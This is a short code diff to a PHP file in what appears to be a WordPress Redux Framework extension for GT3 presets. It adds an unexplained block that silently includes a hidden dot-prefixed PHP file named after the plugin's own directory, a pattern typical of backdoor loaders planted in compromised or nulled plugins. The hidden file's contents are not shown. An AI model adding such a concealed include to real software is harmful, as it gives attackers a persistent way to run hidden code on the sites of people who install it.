@@ -199,6 +199,10 @@ if( !class_exists( 'ReduxFramework_extension_gt3_presets' ) ) {
 
 
 } // if
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function gt3_array_keys_exists(array $keys, array $arr) {
     $gt3_flip_array = array_flip($keys);
